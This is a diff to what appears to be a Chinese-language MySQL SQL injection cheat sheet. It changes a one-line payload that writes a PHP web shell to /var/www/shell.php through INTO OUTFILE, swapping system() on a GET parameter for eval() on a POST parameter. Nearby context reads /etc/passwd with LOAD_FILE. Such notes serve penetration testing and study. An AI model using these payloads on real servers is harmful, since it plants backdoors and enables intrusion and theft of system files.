@@ -39,7 +39,7 @@ SELECT LOAD_FILE('/etc/passwd');
 #### 3.写文件
 INTO OUTFILE/DUMPFILE
 ```
-SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
+SELECT '<? @eval($_POST[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
 ```
 ### 0x03常用常量和函数
 @@global.secure_file_priv
